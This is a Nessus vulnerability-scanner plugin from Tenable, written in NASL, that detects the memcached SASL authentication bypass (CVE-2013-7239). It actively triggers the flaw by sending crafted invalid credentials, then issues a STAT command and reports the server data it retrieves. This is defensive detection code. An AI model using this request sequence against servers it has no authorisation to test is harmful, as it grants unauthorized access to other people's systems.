#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72217);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2013-7239");
  script_bugtraq_id(64559);
  script_osvdb_id(101565);

  script_name(english:"memcached SASL Authentication Security Bypass");
  script_summary(english:"Checks for presence of SASL authentication bypass");

  script_set_attribute(attribute:"synopsis", value:"The remote object store has an authentication bypass vulnerability.");
  script_set_attribute(
    attribute:"description",
    value:
"The version of memcached on the remote host has an authentication
bypass vulnerability.  This flaw is related to the management of the
SASL authentication state.  With a series of specially crafted requests,
a remote attacker can authenticate with invalid SASL credentials. 
Successful exploitation allows the attacker to perform unauthorized
actions, which may aid in launching further attacks."
  );
  script_set_attribute(attribute:"see_also", value:"http://code.google.com/p/memcached/issues/detail?id=316");
  script_set_attribute(attribute:"see_also", value:"http://code.google.com/p/memcached/wiki/ReleaseNotes1417");
  script_set_attribute(attribute:"solution", value:"Upgrade to memcached 1.4.17 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/12/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/01/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:memcached:memcached");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("memcached_detect.nasl");
  script_require_ports("Services/memcached", 11211);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");
include("memcache.inc");

port = get_service(svc:'memcached', default:11211, exit_on_fail:TRUE);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

#
# Check if server supports SASL
#
req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_MECH);
send(socket: soc, data:req);
res = mcb_read_resp(socket: soc);
if (isnull(res))audit(AUDIT_RESP_NOT, port, 'a request to list SASL mechanisms');

ret = mcb_parse_resp(res);
if (isnull(ret))
  exit(1, "Failed to parse the response to a 'list SASL mechanisms' request.");

# memcached server not compiled with SASL support doesn't understand any SASL-related command
# This vuln is only applicable to memcached server with SASL enabled.
if (ret['status'] == MEMCACHE_RESP_UNK_CMD)
  exit(0, 'The service listening on port ' + port + ' is not affected because it does not appear to support SASL.');

if (ret['status'] != MEMCACHE_RESP_NO_ERROR)
  audit(code:1, AUDIT_RESP_BAD, port, 'a request to list SASL mechanisms');

# Get supported SASL mechanisms
mechs = ret['value'];

#
# For successful exploit, we have to specify the invalid credential using a server-supported SASL mechanism.
# For example, the exploit doesn't work if we use the PLAIN mechanism (along with invalid credential)
# to authenticate but that mechanism is not supported by the server.
#
# We only support PLAIN, CRAM-MD5, and DIGEST-MD5.
# For other mechanisms, we do a remote version check since the vuln is patched in version 1.4.17

#
# Check the vuln directly if the server supports one of our supported mechanisms
#
if ('PLAIN' >< mechs || 'CRAM-MD5' >< mechs || 'DIGEST-MD5' >< mechs)
{
  if ('PLAIN' >< mechs)
  {
    mech = 'PLAIN';
    cred = '\x00' + 'user_' + SCRIPT_NAME +
           '\x00' + 'pass_' + SCRIPT_NAME;
    req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_AUTH,key:mech, value:cred);
    send(socket: soc, data:req);
    res = mcb_read_resp(socket: soc);
    if (isnull(res))audit(code:1, AUDIT_RESP_NOT, port, 'an SASL PLAIN authentication request');

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the response to a SASL PLAIN authentication request.');

    # Expect auth failure
    if (ret['status'] != MEMCACHE_RESP_AUTH_ERR)
      audit(code:1, AUDIT_RESP_BAD, port, 'an SASL PLAIN authentication request');
  }
  else if ('CRAM-MD5' >< mechs)
  {
    mech = 'CRAM-MD5';
    req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_AUTH,key:mech);
    send(socket: soc, data:req);
    res = mcb_read_resp(socket: soc);
    if (isnull(res))audit(AUDIT_RESP_NOT, code:1, port, 'a SASL CRAM-MD5 authentication request');

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the response to a SASL CRAM-MD5 authentication request.');

    # Expect auth continue
    if (ret['status'] != MEMCACHE_RESP_AUTH_CONTINUE)
      audit(code:1, AUDIT_RESP_BAD, port, 'a SASL CRAM-MD5 authentication request');

    # Send invalid credentials
    cred =  'user_' + SCRIPT_NAME +
            ' ' +
            rand_str(length:16 * 2, charset:'0123456789abcdef');

    req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_STEP,key:mech, value:cred);
    send(socket: soc, data:req);
    res = mcb_read_resp(socket: soc);
    if (isnull(res))audit(AUDIT_RESP_NOT, code:1, port, 'a SASL CRAM-MD5 authentication step request');

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the response to a SASL CRAM-MD5 authentication step request.');

    # Expect auth failure
    if (ret['status'] != MEMCACHE_RESP_AUTH_ERR)
      audit(code:1, AUDIT_RESP_BAD, port, 'a SASL CRAM-MD5 authentication step request');
  }
  else if ('DIGEST-MD5' >< mechs)
  {
    mech = 'DIGEST-MD5';
    req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_AUTH,key:mech);
    send(socket: soc, data:req);
    res = mcb_read_resp(socket: soc);
    if (isnull(res))audit(AUDIT_RESP_NOT, code:1, port, 'a SASL DIGEST-MD5 authentication request');

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the response to a SASL DIGEST-MD5 authentication request.');

    # Expect auth continue
    if (ret['status'] != MEMCACHE_RESP_AUTH_CONTINUE)
      audit(code:1, AUDIT_RESP_BAD, port, 'a SASL DIGEST-MD5 authentication request');

    # Send fake/wrong credential
    cred = ret['value'];
    cred += ',' +
            'username="' + SCRIPT_NAME + '",' +
            'cnonce="CNj8mS5Da+ghG+bXCQZD1C1O9NWEUtfC/wH5o6gTCFw=",' +
            'nc=00000001,' +
            'digest-uri="memcached/' + get_host_ip() + '",' +
            'response=d741723f66b87cb868031ae4dec29e31';

    req = mcb_mk_req(cmd:MEMCACHE_CMD_SASL_STEP,key:mech, value:cred);
    send(socket: soc, data:req);
    res = mcb_read_resp(socket: soc);
    if (isnull(res))audit(AUDIT_RESP_NOT, code:1, port, 'a SASL DIGEST-MD5 authentication step request');

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the response to a SASL DIGEST-MD5 authentication step request.');

    # Expect auth failure
    if (ret['status'] != MEMCACHE_RESP_AUTH_ERR)
      audit(code:1, AUDIT_RESP_BAD, port, 'a SASL DIGEST-MD5 authentication step request');
  }

  #
  # Go ahead to issue a STAT command despite the auth fails
  #
  req = mcb_mk_req(cmd:MEMCACHE_CMD_STAT);
  send(socket: soc, data:req);

  # returned STAT data is a packet consisting of multiple memcache responses, each of which is key-value pairs
  stats = NULL;
  while (1)
  {
    res = mcb_read_resp(socket: soc);
    if (isnull(res)) break;

    ret = mcb_parse_resp(res);
    if (isnull(ret))
      exit(1, 'Failed to parse the STAT response.');

    # Patched server will return an error status
    if (ret['status'] != MEMCACHE_RESP_NO_ERROR)
    {
      vuln = FALSE;
      break;
    }
    # Vulnerable server will return STAT data
    else
    {
      vuln = TRUE;
      # Last response has no key/value pair
      if (isnull(ret['key'])) break;
      stats += ret['key'] + ': ' + ret['value'] + '\n';
    }
  }
  close(soc);

  report = NULL;
  if (vuln)
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'The remote memcached server supports the following SASL mechanisms :' +
        '\n' +
        '\n' + mechs + 
        '\n' +
        '\n' + 'And Nessus was able to authenticate with invalid credentials using ' + mech + 
        '\n' + ', issue a STAT command and retrieve the following info :' +
        '\n' +
        '\n' + stats;
    }
    security_warning(port:port, extra: report);
  }
  else audit(AUDIT_LISTEN_NOT_VULN, 'memcached', port);
}
#
# Check the vuln by comparing versions
#
else
{
  ver = get_kb_item_or_exit('memcached/version/'+port);
  fixed = '1.4.17';
  re = make_array(-2, "_beta(\d+)",
                  -1, "_rc(\d+)");

  report = NULL;
  # Version 1.6.0_beta1 is actually vulnerable, but the version is greater than the fixed version 1.4.17
  # Based on the release dates at
  # http://code.google.com/p/memcached/downloads/list?can=1&q=&colspec=Filename+Summary+Uploaded+ReleaseDate+Size+DownloadCount, it could be a typo in the version? 1.6.0_beta1 may meant be 1.4.6_beta1?
  if (ver == '1.6.0_beta1')
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'The remote memcached server supports the following SASL mechanisms :' +
        '\n' +
        '\n' + mechs + 
        '\n' +
        '\n' + 'Although memcached version ' + ver + ' seems to be greater than the fixed version ' + 
        '\n' + fixed + ', it is known to be vulnerable.';
    }
    security_warning(port:port, extra:report);

  }
  else if (ver_compare(ver:ver, fix:fixed, regexes:re) < 0)
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'The remote memcached server supports the following SASL mechanisms :' +
        '\n' +
        '\n' + mechs + 
        '\n' +
        '\n' + '  Installed version : ' + ver +
        '\n' + '  Fixed version     : ' + fixed +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else audit(AUDIT_INST_VER_NOT_VULN, 'memcached', ver);
}
